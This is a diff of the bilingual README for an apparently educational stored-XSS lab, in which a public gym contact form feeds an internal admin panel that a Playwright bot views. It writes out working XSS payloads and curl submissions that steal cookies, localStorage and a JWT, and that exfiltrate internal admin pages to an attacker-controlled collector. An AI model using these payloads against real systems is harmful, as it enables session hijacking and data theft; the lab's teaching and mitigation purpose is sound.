@@ -1,280 +1,219 @@
-# Dalfox XSS Lab
+# Stored XSS Lab
 
-Stored XSS / second-order XSS laboratory for isolated demonstrations with Docker Compose, Nginx, Node.js, PostgreSQL, Playwright, and a manual Python collector.
+## Español
 
-This repository starts in intentionally vulnerable mode. Use it only in a controlled environment that you own.
+Laboratorio de Stored XSS y second-order XSS para demostraciones aisladas con Docker Compose, Nginx, Node.js, PostgreSQL, Playwright y helpers manuales o automatizados de exfiltración.
 
-## What This Lab Demonstrates
+Este repositorio arranca en modo intencionalmente vulnerable. Úsalo solo en un entorno controlado que te pertenezca.
 
-1. A public form on `cross.fit` stores attacker-controlled content.
-2. An internal admin panel on `backend.cross.fit` later renders that content.
-3. A privileged browser session can become the bridge to an internal system even when the attacker cannot reach that backend directly.
-4. A JWT stored client-side in the privileged browser can be stolen and then replayed explicitly against protected backend routes.
-5. Mitigations such as contextual output escaping and CSP reduce or block exploitation.
+### Guías
 
-## Architecture
+- Guía paso a paso en español: [docs/step-by-step-lab-es.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-es.md:1)
+- Walkthrough en inglés: [docs/step-by-step-lab-en.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-en.md:1)
+- Índice: [docs/step-by-step-lab.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab.md:1)
 
-Services:
+### Resumen
 
-- `public-proxy`: only published entrypoint on host port `80`
-- `public-app`: public gym landing page and contact form
-- `internal-proxy`: Docker-only reverse proxy for `backend.cross.fit`
-- `internal-app`: internal admin panel
-- `worker`: Playwright browser logged in as admin
+- Un formulario público en `cross.fit` almacena contenido controlado por el atacante.
+- Un panel interno en `backend.cross.fit` renderiza ese contenido más adelante.
+- Una sesión privilegiada del navegador se convierte en el puente hacia un sistema interno que el atacante no puede navegar directamente.
+- Un JWT almacenado del lado cliente en el navegador privilegiado puede robarse y reutilizarse explícitamente contra rutas protegidas.
+- Mitigaciones como el escape contextual y CSP reducen o bloquean la explotación.
+
+### Arquitectura
+
+Servicios:
+
+- `public-proxy`: único entrypoint publicado en el host por el puerto `80`
+- `public-app`: landing pública del gimnasio y formulario de contacto
+- `internal-proxy`: reverse proxy interno solo visible desde Docker para `backend.cross.fit`
+- `internal-app`: panel interno de administración
+- `worker`: navegador Playwright autenticado como admin
 - `db`: PostgreSQL 16
 
-Trust boundary:
+Límite de confianza:
 
-- `cross.fit` is reachable from the attacker machine.
-- `backend.cross.fit` is only resolvable inside Docker through the `internal-proxy` alias.
-- The attacker should not be able to browse `backend.cross.fit` directly through the exposed port.
+- `cross.fit` es accesible desde la máquina atacante.
+- `backend.cross.fit` solo resuelve dentro de Docker a través de `internal-proxy`.
+- El atacante no debería navegar `backend.cross.fit` directamente desde el puerto expuesto del host.
 
-## Repository Layout
+### Estructura
 
 ```text
 .
 ├── docker-compose.yml
 ├── db/
+├── docs/
 ├── nginx/
 ├── public-app/
 ├── internal-app/
-├── worker/
 ├── tools/
-└── docs/project_notes/
+└── worker/
 ```
 
-## Requirements
+### Requisitos
 
 - Docker Engine + Docker Compose plugin
 - `curl`
 - Python 3
-- Optional: Dalfox on the attacker machine
 
-## Local Domains
+### Dominios locales
 
-Variables used in this guide:
+Variables usadas en esta guía:
 
-- `container_machine_ip`: IP of the machine that is running the lab containers
-- `attacker_machine_ip`: IP of the attacker machine
-- `docker_host_gateway_ip`: optional host gateway visible from containers when attacker and lab run on the same host
+- `container_machine_ip`: IP de la máquina que levanta los contenedores
+- `attacker_machine_ip`: IP de la máquina atacante
+- `docker_host_gateway_ip`: gateway opcional visible desde los contenedores cuando atacante y laboratorio comparten host
 
-### Attacker machine
-
-Add only this mapping:
+Máquina atacante:
 
 ```text
 container_machine_ip   cross.fit
 ```
 
-Do not add:
+No agregues:
 
 ```text
 container_machine_ip   backend.cross.fit
 ```
 
-Reason:
+### Configuración
 
-- the attacker should resolve `cross.fit`
-- the attacker should not resolve `backend.cross.fit` directly
-
-### Same-host note
-
-If you are validating the lab from a single machine instead of two separate machines, some XSS callbacks may need to target the Docker host gateway instead of a second host. In that case, use a value such as `docker_host_gateway_ip` in the payloads.
-
-## Configuration
-
-Copy `.env.example` to `.env` if you want persistent local overrides:
+Copia `.env.example` a `.env` si quieres overrides locales.
 
 ```bash
 cp .env.example .env
 ```
 
-Supported variables:
+Variables soportadas:
 
 - `LAB_MODE=vulnerable|mitigated`
-- `JWT_SECRET=` optional explicit override
-- `AUTH_TOKEN_TTL=` optional explicit override
-- `ENABLE_CSP=` optional explicit override
-- `RENDER_UNSAFE_HTML=` optional explicit override
+- `JWT_SECRET=`
+- `AUTH_TOKEN_TTL=`
+- `ENABLE_CSP=`
+- `RENDER_UNSAFE_HTML=`
 - `POLL_INTERVAL_SECONDS=20`
 
-Behavior:
+Comportamiento:
 
-- `vulnerable`:
-  - raw HTML rendering enabled
-  - internal auth stays as explicit JWT
-  - CSP disabled
-- `mitigated`:
-  - escaped output enabled
-  - CSP enabled
+- `vulnerable`: renderizado de HTML crudo habilitado, auth JWT explícita mantenida, CSP deshabilitado
+- `mitigated`: salida escapada habilitada, CSP habilitado
 
-## Start The Lab
+### Levantar
 
 ```bash
 docker compose up --build -d
 ```
 
-Check status:
+Verifica estado:
 
 ```bash
 docker compose ps
 ```
 
-Expected:
+Esperado:
 
-- `public-proxy` published on `0.0.0.0:80`
-- `public-app`, `internal-app`, `internal-proxy`, `db`, and `worker` running
-- no published host ports for `3000`, `3001`, or `5432`
+- `public-proxy` publicado en `0.0.0.0:80`
+- `public-app`, `internal-app`, `internal-proxy`, `db` y `worker` ejecutándose
+- sin puertos publicados para `3000`, `3001` o `5432`
 
-## Reset The Lab Database
-
-After a full lab run, you can restore the database to a clean baseline with:
+### Reiniciar el laboratorio
 
 ```bash
 ./tools/reset-db.sh
 ```
 
-This reset does the following:
+Este reset elimina mensajes viejos, recrea `admin/admin123` e inserta mensajes de ejemplo benignos.
 
-- removes all rows from `contact_messages`
-- removes all rows from `internal_users`
-- recreates the internal user `admin/admin123`
-- inserts a small set of benign example contact messages
-
-SQL source:
+SQL usado:
 
 ```text
 db/reset_lab.sql
 ```
 
-Expected result after reset:
+### Validación de infraestructura
 
-- the worker can log in again as `admin`
-- there are no old XSS payloads left in the database
-- the message list starts from a known baseline
-
-## Infrastructure Validation
-
-### Public entrypoint
+Entrada pública:
 
 ```bash
 curl -i http://cross.fit/
 ```
 
-Expected: landing page for `CrossFit Atlas`.
+Esperado: landing pública.
 
-### Backend isolation
+Aislamiento del backend:
 
 ```bash
 curl -i -H "Host: backend.cross.fit" http://container_machine_ip/
 ```
 
-Expected: connection closed, empty reply, or a non-success response. The internal backend must not be reachable through the published port.
+Esperado: conexión cerrada, respuesta vacía o respuesta no exitosa.
 
-### Worker access to internal backend
+Acceso del worker al backend interno:
 
 ```bash
 docker compose exec -T worker wget -S -O- http://backend.cross.fit/login
 ```
 
-Expected: `200 OK`.
+Esperado: `200 OK`.
 
-## Public App Flow
+### Flujo de la app pública
 
-Open:
+Abre:
 
 ```text
 http://cross.fit
 ```
 
-Submit the contact form with:
+Envía el formulario con `full_name`, `email`, `phone` opcional y `message`.
 
-- `full_name`
-- `email`
-- optional `phone`
-- `message`
+El campo `message` se almacena intencionalmente sin sanitización en modo vulnerable.
 
-The `message` field is intentionally stored without sanitization in vulnerable mode.
-
-## Optional Collector Script
-
-Later in the lab, when you no longer want to capture requests by hand, you can use the bundled collector:
+### Collector opcional
 
 ```bash
 python3 tools/collector.py
 ```
 
-It listens on:
+Listener:
 
 ```text
 0.0.0.0:9000
 ```
 
-## Step-by-Step Presentation Flow
+### Guías paso a paso
 
-The full walkthrough now lives in [docs/step-by-step-lab.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab.md:1).
+- Español: [docs/step-by-step-lab-es.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-es.md:1)
+- English: [docs/step-by-step-lab-en.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-en.md:1)
 
-Use that guide for the live sequence of:
+### Payloads
 
-- probe request execution
-- cookie probe and `localStorage` discovery
-- JWT confirmation
-- front page HTML exfiltration
-- transition to the scripted collector
+Reemplaza placeholders:
 
-## Payloads
+- `attacker_machine_ip`
+- `docker_host_gateway_ip` solo para validación en el mismo host
 
-Replace:
-
-- `attacker_machine_ip` with the IP of the attacker machine
-- `docker_host_gateway_ip` only when doing same-host validation
-
-### Probe request to a manual Python HTTP server
-
-Use this first if you only want to prove code execution against the internal backend:
+#### Sonda de ejecución
 
 ```html
 <img src=x onerror="new Image().src='http://attacker_machine_ip:8000/ping'">
 ```
 
-Same-host validation shortcut:
+Mismo host:
 
 ```html
 <img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/ping'">
 ```
 
-Expected on the attacker machine with `python3 -m http.server 8000`:
-
-```text
-"GET /ping HTTP/1.1" 404 -
-```
-
-The `404` is fine. What matters is that the request reached the attacker-controlled server.
-
-### Cookie theft probe
-
-Use this short payload first if you want to check whether the privileged browser exposes a useful session cookie:
+#### Sonda de cookie
 
 ```html
 <img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?c='+encodeURIComponent(document.cookie)">
 ```
 
-Same-host validation shortcut:
+#### Enumeración de `localStorage`
 
-```html
-<img src=x onerror="new Image().src='http://docker_host_gateway_ip:9000/collect?c='+encodeURIComponent(document.cookie)">
-```
-
-Expected in the current JWT-based lab:
-
-- `collector.py` receives `GET /collect`
-- `c=` may be empty or may not contain a reusable session credential
-
-### `localStorage` enumeration from the privileged browser
-
-Use this next if the cookie probe was not enough and you want to discover how the privileged browser stores reusable state.
-
-The full inline version is:
+Versión inline de referencia, demasiado grande para el campo `message` de `250` caracteres.
 
 ```html
 <script>
@@ -290,73 +229,21 @@ for (let i = 0; i < localStorage.length; i += 1) {
 </script>
 ```
 
-Same-host validation shortcut:
-
-```html
-<script>
-for (let i = 0; i < localStorage.length; i += 1) {
-  const key = localStorage.key(i);
-  const value = localStorage.getItem(key) || '';
-  new Image().src =
-    'http://docker_host_gateway_ip:9000/collect?key=' +
-    encodeURIComponent(key) +
-    '&value=' +
-    encodeURIComponent(value);
-}
-</script>
-```
-
-That inline payload is too large for the public `message` field once it is limited to `250` characters, so in practice you should load it from an external file.
-
-### `localStorage` enumeration via external JavaScript
-
-Serve:
-
-```text
-tools/payload-localstorage-scan.js
-```
-
-and submit:
+Helper externo:
 
 ```html
 <script src="http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js"></script>
 ```
 
-Same-host validation shortcut:
-
-```html
-<script src="http://docker_host_gateway_ip:8000/tools/payload-localstorage-scan.js"></script>
-```
-
-Expected in vulnerable mode:
-
-- `collector.py` receives one or more `GET /collect`
-- at least one leaked value has the shape of a JWT
-
-### JWT theft from the privileged browser
-
-Use this after you already identified the `localStorage` key that contains the JWT:
+#### Robo de JWT
 
 ```html
 <img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
 ```
 
-Same-host validation shortcut:
+#### Portada sin JWT
 
-```html
-<img src=x onerror="new Image().src='http://docker_host_gateway_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
-```
-
-Expected in vulnerable mode:
-
-- `collector.py` receives `GET /collect`
-- the query contains `jwt=eyJ...`
-
-### Backend front page exfiltration in Base64
-
-Use this after stealing the JWT, when you want to retrieve the unauthenticated front page of `backend.cross.fit` and decode it locally.
-
-This is the inline version shown for reference:
+Versión inline de referencia:
 
 ```html
 <script>
@@ -374,15 +261,28 @@ fetch('/')
 </script>
 ```
 
-Same-host validation shortcut:
+Helper externo:
+
+```html
+<script src="http://attacker_machine_ip:8000/tools/payload-frontpage.js"></script>
+```
+
+#### Portada con JWT
+
+Versión inline de referencia:
 
 ```html
 <script>
-fetch('/')
+const token = localStorage.getItem('gym_internal_token');
+fetch('/', {
+  headers: {
+    Authorization: 'Bearer ' + token
+  }
+})
   .then(r => r.text())
   .then(html => {
     const b64 = btoa(unescape(encodeURIComponent(html)));
-    fetch('http://docker_host_gateway_ip:9000/internal-html', {
+    fetch('http://attacker_machine_ip:9000/internal-html', {
       method: 'POST',
       mode: 'no-cors',
       headers: { 'Content-Type': 'text/plain' },
@@ -392,33 +292,485 @@ fetch('/')
 </script>
 ```
 
-Like the inline `localStorage` enumeration payload, this one does not fit in the current `250` character `message` field.
+Helper externo:
 
-In practice you should load it through the external helper below.
+```html
+<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-with-jwt.js"></script>
+```
+
+Esperado: el HTML decodificado debería mostrar el dashboard.
+
+#### `/admin` con JWT
+
+```html
+<script>
+const token = localStorage.getItem('gym_internal_token');
+fetch('/admin', {
+  headers: {
+    Authorization: 'Bearer ' + token
+  }
+})
+  .then(r => r.text())
+  .then(html => {
+    const b64 = btoa(unescape(encodeURIComponent(html)));
+    fetch('http://attacker_machine_ip:9000/internal-html', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: b64
+    });
+  });
+</script>
+```
+
+#### `/admin/messages` con JWT
+
+Versión inline de referencia:
+
+```html
+<script>
+const token = localStorage.getItem('gym_internal_token');
+fetch('/admin/messages', {
+  headers: {
+    Authorization: 'Bearer ' + token
+  }
+})
+  .then(r => r.text())
+  .then(html => {
+    const b64 = btoa(unescape(encodeURIComponent(html)));
+    fetch('http://attacker_machine_ip:9000/internal-html', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: b64
+    });
+  });
+</script>
+```
+
+Helper externo:
+
+```html
+<script src="http://attacker_machine_ip:8000/tools/payload-messages-with-jwt.js"></script>
+```
+
+Esperado: el HTML decodificado debería contener la tabla completa de mensajes, incluyendo email y teléfono.
+
+#### XSS visual
+
+```html
+<script>alert('XSS ejecutado en backend.cross.fit')</script>
+```
+
+### Ejemplos con curl
+
+#### Mensaje legítimo
+
+```bash
+curl -i -X POST http://cross.fit/contact \
+  -d "full_name=Juan Perez" \
+  -d "email=juan@example.com" \
+  -d "phone=099123456" \
+  -d "message=Quiero informacion sobre planes mensuales"
+```
+
+#### Loader externo de `localStorage`
+
+```bash
+curl -i -X POST http://cross.fit/contact \
+  -d "full_name=Alumno XSS Storage JS" \
+  -d "email=xss-storage-js@example.com" \
+  -d "phone=099000000" \
+  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js\"></script>"
+```
+
+#### Robo de JWT
+
+```bash
+curl -i -X POST http://cross.fit/contact \
+  -d "full_name=Alumno XSS" \
+  -d "email=xss@example.com" \
+  -d "phone=099000000" \
+  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')\">"
+```
+
+#### Sonda de ejecución
+
+```bash
+curl -i -X POST http://cross.fit/contact \
+  -d "full_name=Alumno XSS Probe" \
+  -d "email=xss-probe@example.com" \
+  -d "phone=099000009" \
+  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:8000/ping'\">"
+```
+
+#### Portada sin JWT
+
+```bash
+curl -i -X POST http://cross.fit/contact \
+  -d "full_name=Alumno XSS Frontpage JS" \
+  -d "email=xss-frontpage-js@example.com" \
+  -d "phone=099000013" \
+  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-frontpage.js\"></script>"
+```
+
+#### Portada con JWT
+
+```bash
+curl -i -X POST http://cross.fit/contact \
+  -d "full_name=Alumno XSS Root JWT JS" \
+  -d "email=xss-root-jwt-js@example.com" \
+  -d "phone=099000014" \
+  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-frontpage-with-jwt.js\"></script>"
+```
+
+#### `/admin/messages` con JWT
+
+```bash
+curl -i -X POST http://cross.fit/contact \
+  -d "full_name=Alumno XSS Messages JS" \
+  -d "email=xss-messages-js@example.com" \
+  -d "phone=099000015" \
+  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-messages-with-jwt.js\"></script>"
+```
+
+### Comportamiento del worker
+
+1. Pide un JWT a `http://backend.cross.fit/api/login`
+2. Guarda ese JWT en el `localStorage` del navegador privilegiado
+3. Visita `/admin/messages/next?token=...`
+4. Espera a que la página renderice
+5. Marca el mensaje como procesado
+
+Logs:
+
+```bash
+docker compose logs -f worker
+```
+
+### Modo mitigado
+
+```bash
+LAB_MODE=mitigated docker compose up -d --build internal-app worker
+```
+
+Comportamiento mitigado:
+
+- salida escapada en vez de HTML crudo
+- CSP bloquea scripts y handlers inline
+- el modelo JWT explícito se mantiene, pero el sink XSS deja de ejecutar
+
+### Validar mitigación
+
+1. Inicia un `collector.py` limpio.
+2. Cambia a modo mitigado.
+3. Envía los mismos payloads.
+4. Observa los logs del worker.
+5. Confirma que no llega exfiltración.
+
+Esperado:
+
+- el worker sigue procesando el mensaje
+- el payload se renderiza como texto
+- no llega robo de JWT al collector
+- no llega ningún `POST /internal-html`
+
+### Apagado
+
+```bash
+docker compose down -v
+```
+
+### Inseguridad intencional
+
+Este repositorio incluye intencionalmente:
+
+- HTML controlado por el atacante en el flujo público
+- un sink vulnerable de HTML crudo en la vista interna de detalle cuando `LAB_MODE=vulnerable`
+- credenciales estáticas de laboratorio (`admin/admin123`)
+- un JWT guardado en `localStorage` dentro del navegador privilegiado
+
+### Referencias
+
+- OWASP Cross-Site Scripting:
+  `https://owasp.org/www-community/attacks/xss/`
+- OWASP XSS Prevention Cheat Sheet:
+  `https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html`
+- MDN Web Storage API:
+  `https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API`
+- Docker Compose Networking:
+  `https://docs.docker.com/compose/how-tos/networking/`
+- Nginx access controls:
+  `https://nginx.org/en/docs/http/ngx_http_access_module.html`
+
+## English
+
+Stored XSS and second-order XSS lab for isolated demonstrations with Docker Compose, Nginx, Node.js, PostgreSQL, Playwright, and manual or scripted exfiltration helpers.
+
+This repository starts in intentionally vulnerable mode. Use it only in a controlled environment that you own.
+
+### Guides
+
+- English walkthrough: [docs/step-by-step-lab-en.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-en.md:1)
+- Spanish walkthrough: [docs/step-by-step-lab-es.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-es.md:1)
+- Index: [docs/step-by-step-lab.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab.md:1)
+
+### Overview
+
+- A public form on `cross.fit` stores attacker-controlled content.
+- An internal admin panel on `backend.cross.fit` renders that content later.
+- A privileged browser session becomes the bridge to an internal system that the attacker cannot browse directly.
+- A JWT stored client-side in the privileged browser can be stolen and replayed explicitly against protected routes.
+- Mitigations such as contextual escaping and CSP reduce or block exploitation.
+
+### Architecture
+
+Services:
+
+- `public-proxy`: only published entrypoint on host port `80`
+- `public-app`: public gym landing page and contact form
+- `internal-proxy`: Docker-only reverse proxy for `backend.cross.fit`
+- `internal-app`: internal admin panel
+- `worker`: Playwright browser logged in as admin
+- `db`: PostgreSQL 16
+
+Trust boundary:
+
+- `cross.fit` is reachable from the attacker machine.
+- `backend.cross.fit` is only resolvable inside Docker through `internal-proxy`.
+- The attacker should not browse `backend.cross.fit` directly from the exposed host port.
+
+### Repository Layout
+
+```text
+.
+├── docker-compose.yml
+├── db/
+├── docs/
+├── nginx/
+├── public-app/
+├── internal-app/
+├── tools/
+└── worker/
+```
+
+### Requirements
+
+- Docker Engine + Docker Compose plugin
+- `curl`
+- Python 3
+
+### Local Domains
+
+Variables used in this guide:
+
+- `container_machine_ip`: IP of the machine running the lab containers
+- `attacker_machine_ip`: IP of the attacker machine
+- `docker_host_gateway_ip`: optional host gateway visible from containers when attacker and lab share the same host
+
+Attacker machine:
+
+```text
+container_machine_ip   cross.fit
+```
+
+Do not add:
+
+```text
+container_machine_ip   backend.cross.fit
+```
+
+### Configuration
+
+Copy `.env.example` to `.env` if you want local overrides.
+
+```bash
+cp .env.example .env
+```
+
+Supported variables:
+
+- `LAB_MODE=vulnerable|mitigated`
+- `JWT_SECRET=`
+- `AUTH_TOKEN_TTL=`
+- `ENABLE_CSP=`
+- `RENDER_UNSAFE_HTML=`
+- `POLL_INTERVAL_SECONDS=20`
+
+Behavior:
+
+- `vulnerable`: raw HTML rendering enabled, explicit JWT auth kept, CSP disabled
+- `mitigated`: escaped output enabled, CSP enabled
+
+### Start
+
+```bash
+docker compose up --build -d
+```
+
+Check status:
+
+```bash
+docker compose ps
+```
 
 Expected:
 
-- the attacker-side listener receives `POST /internal-html`
-- the raw body is Base64
-- decoding it yields the login page HTML of `backend.cross.fit`
+- `public-proxy` published on `0.0.0.0:80`
+- `public-app`, `internal-app`, `internal-proxy`, `db`, and `worker` running
+- no published host ports for `3000`, `3001`, or `5432`
 
-### Backend front page exfiltration via external JavaScript
+### Reset The Lab
 
-Use this one through the public form:
+```bash
+./tools/reset-db.sh
+```
+
+This reset removes old messages, recreates `admin/admin123`, and inserts benign sample messages.
+
+SQL source:
+
+```text
+db/reset_lab.sql
+```
+
+### Infrastructure Validation
+
+Public entrypoint:
+
+```bash
+curl -i http://cross.fit/
+```
+
+Expected: public landing page.
+
+Backend isolation:
+
+```bash
+curl -i -H "Host: backend.cross.fit" http://container_machine_ip/
+```
+
+Expected: connection closed, empty reply, or a non-success response.
+
+Worker access to internal backend:
+
+```bash
+docker compose exec -T worker wget -S -O- http://backend.cross.fit/login
+```
+
+Expected: `200 OK`.
+
+### Public App Flow
+
+Open:
+
+```text
+http://cross.fit
+```
+
+Submit the form with `full_name`, `email`, optional `phone`, and `message`.
+
+The `message` field is intentionally stored without sanitization in vulnerable mode.
+
+### Optional Collector
+
+```bash
+python3 tools/collector.py
+```
+
+Listener:
+
+```text
+0.0.0.0:9000
+```
+
+### Step-by-Step Walkthroughs
+
+- English: [docs/step-by-step-lab-en.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-en.md:1)
+- Español: [docs/step-by-step-lab-es.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab-es.md:1)
+
+### Payloads
+
+Replace placeholders:
+
+- `attacker_machine_ip`
+- `docker_host_gateway_ip` only for same-host validation
+
+#### Probe Request
+
+```html
+<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/ping'">
+```
+
+Same-host:
+
+```html
+<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/ping'">
+```
+
+#### Cookie Probe
+
+```html
+<img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?c='+encodeURIComponent(document.cookie)">
+```
+
+#### `localStorage` Enumeration
+
+Inline reference version, too large for the `250` character `message` field.
+
+```html
+<script>
+for (let i = 0; i < localStorage.length; i += 1) {
+  const key = localStorage.key(i);
+  const value = localStorage.getItem(key) || '';
+  new Image().src =
+    'http://attacker_machine_ip:9000/collect?key=' +
+    encodeURIComponent(key) +
+    '&value=' +
+    encodeURIComponent(value);
+}
+</script>
+```
+
+External helper:
+
+```html
+<script src="http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js"></script>
+```
+
+#### JWT Theft
+
+```html
+<img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
+```
+
+#### Front Page Without JWT
+
+Inline reference version:
+
+```html
+<script>
+fetch('/')
+  .then(r => r.text())
+  .then(html => {
+    const b64 = btoa(unescape(encodeURIComponent(html)));
+    fetch('http://attacker_machine_ip:9000/internal-html', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: b64
+    });
+  });
+</script>
+```
+
+External helper:
 
 ```html
 <script src="http://attacker_machine_ip:8000/tools/payload-frontpage.js"></script>
 ```
 
-Same-host validation shortcut:
-
-```html
-<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage.js"></script>
-```
-
-### Front page request with explicit JWT
-
-This repeats the request to `/`, but now sending the stolen JWT.
+#### Front Page With JWT
 
 Inline reference version:
 
@@ -443,30 +795,15 @@ fetch('/', {
 </script>
 ```
 
-This inline version does not fit in the current `250` character `message` field.
-
-### Front page request with explicit JWT via external JavaScript
-
-Use this one through the public form:
+External helper:
 
 ```html
 <script src="http://attacker_machine_ip:8000/tools/payload-frontpage-with-jwt.js"></script>
 ```
 
-Same-host validation shortcut:
+Expected: decoded HTML should show the dashboard.
 
-```html
-<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage-with-jwt.js"></script>
-```
-
-Expected:
-
-- the returned HTML corresponds to the dashboard
-- the dashboard includes a link to `/admin/messages`
-
-### Protected dashboard exfiltration with explicit JWT
-
-Once you have the stolen JWT and confirmed that it is stored as `gym_internal_token`, you can replay it explicitly to request `/admin`:
+#### `/admin` With JWT
 
 ```html
 <script>
@@ -489,12 +826,7 @@ fetch('/admin', {
 </script>
 ```
 
-Expected:
-
-- the returned HTML corresponds to `/admin`
-- the dashboard includes a link to `/admin/messages`
-
-### Protected message list exfiltration with explicit JWT
+#### `/admin/messages` With JWT
 
 Inline reference version:
 
@@ -519,41 +851,23 @@ fetch('/admin/messages', {
 </script>
 ```
 
-This inline version does not fit in the current `250` character `message` field.
-
-### Protected message list exfiltration via external JavaScript
-
-Use this one through the public form:
+External helper:
 
 ```html
 <script src="http://attacker_machine_ip:8000/tools/payload-messages-with-jwt.js"></script>
 ```
 
-Same-host validation shortcut:
+Expected: decoded HTML should contain the full message table, including email and phone.
 
-```html
-<script src="http://docker_host_gateway_ip:8000/tools/payload-messages-with-jwt.js"></script>
-```
-
-Expected in vulnerable mode:
-
-- `collector.py` receives `POST /internal-html`
-- the body decodes to the HTML of `/admin/messages`
-
-### Visual XSS
+#### Visual XSS
 
 ```html
 <script>alert('XSS ejecutado en backend.cross.fit')</script>
 ```
 
-Expected:
+### curl Examples
 
-- the script executes in the privileged Playwright browser
-- the worker logs the dialog event
-
-## Submit Payloads With curl
-
-### Legitimate message
+#### Legitimate Message
 
 ```bash
 curl -i -X POST http://cross.fit/contact \
@@ -563,21 +877,7 @@ curl -i -X POST http://cross.fit/contact \
   -d "message=Quiero informacion sobre planes mensuales"
 ```
 
-### `localStorage` enumeration payload
-
-This is the inline version shown for reference, but it does not fit in the current `250` character `message` field.
-
-```bash
-curl -i -X POST http://cross.fit/contact \
-  -d "full_name=Alumno XSS Storage" \
-  -d "email=xss-storage@example.com" \
-  -d "phone=099000000" \
-  --data-urlencode "message=<script>for (let i = 0; i < localStorage.length; i += 1) { const key = localStorage.key(i); const value = localStorage.getItem(key) || ''; new Image().src='http://attacker_machine_ip:9000/collect?key='+encodeURIComponent(key)+'&value='+encodeURIComponent(value); }</script>"
-```
-
-### `localStorage` external loader payload
-
-Use this one through the public form:
+#### `localStorage` External Loader
 
 ```bash
 curl -i -X POST http://cross.fit/contact \
@@ -587,7 +887,7 @@ curl -i -X POST http://cross.fit/contact \
   --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js\"></script>"
 ```
 
-### JWT theft payload
+#### JWT Theft
 
 ```bash
 curl -i -X POST http://cross.fit/contact \
@@ -597,7 +897,7 @@ curl -i -X POST http://cross.fit/contact \
   --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')\">"
 ```
 
-### Probe request to Python HTTP server
+#### Probe Request
 
 ```bash
 curl -i -X POST http://cross.fit/contact \
@@ -607,17 +907,7 @@ curl -i -X POST http://cross.fit/contact \
   --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:8000/ping'\">"
 ```
 
-### Backend front page exfiltration in Base64
-
-```bash
-curl -i -X POST http://cross.fit/contact \
-  -d "full_name=Alumno XSS Frontpage" \
-  -d "email=xss-frontpage@example.com" \
-  -d "phone=099000011" \
-  --data-urlencode "message=<script>fetch('/').then(r => r.text()).then(html => { const b64 = btoa(unescape(encodeURIComponent(html))); fetch('http://attacker_machine_ip:9000/internal-html', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: b64 }); });</script>"
-```
-
-### Backend front page exfiltration via external JavaScript
+#### Front Page Without JWT
 
 ```bash
 curl -i -X POST http://cross.fit/contact \
@@ -627,7 +917,7 @@ curl -i -X POST http://cross.fit/contact \
   --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-frontpage.js\"></script>"
 ```
 
-### Front page request with explicit JWT via external JavaScript
+#### Front Page With JWT
 
 ```bash
 curl -i -X POST http://cross.fit/contact \
@@ -637,19 +927,7 @@ curl -i -X POST http://cross.fit/contact \
   --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-frontpage-with-jwt.js\"></script>"
 ```
 
-### `/admin/messages` exfiltration payload with explicit JWT
-
-This is the inline reference version and it does not fit in the current `250` character `message` field.
-
-```bash
-curl -i -X POST http://cross.fit/contact \
-  -d "full_name=Alumno XSS 2" \
-  -d "email=xss2@example.com" \
-  -d "phone=099000001" \
-  --data-urlencode "message=<script>const token=localStorage.getItem('gym_internal_token');fetch('/admin/messages',{headers:{Authorization:'Bearer '+token}}).then(r=>r.text()).then(html=>{const b64=btoa(unescape(encodeURIComponent(html)));fetch('http://attacker_machine_ip:9000/internal-html',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:b64});});</script>"
-```
-
-### `/admin/messages` exfiltration via external JavaScript
